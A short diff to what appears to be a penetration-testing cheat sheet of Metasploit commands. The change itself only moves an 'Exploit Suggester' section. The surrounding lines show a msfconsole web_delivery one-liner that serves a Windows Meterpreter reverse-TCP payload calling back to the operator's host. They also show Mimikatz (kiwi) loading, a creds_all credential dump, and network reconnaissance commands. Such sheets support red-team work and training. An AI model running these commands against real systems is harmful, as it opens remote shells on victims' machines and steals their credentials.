@@ -1217,6 +1217,9 @@ msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHO
 32-Bit
 msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHOST $MYIP; set TARGET PSH; set PAYLOAD windows/meterpreter/reverse_tcp; run'
 
++---------- Exploit Suggester ----------+
+run multi/recon/local_exploit_suggester
+
 +---------- Load Modules ----------+
 load kiwi
 load exploit
@@ -1252,9 +1255,6 @@ powershell_execute "arp -a"
 powershell_execute "arp -a -N 10.1.5.4"
 powershell_execute "route print"
 powershell_execute "ipconfig /all"
-
-+---------- Exploit Suggester ----------+
-run multi/recon/local_exploit_suggester
 
 +---------- Dumping ----------+
 creds_all
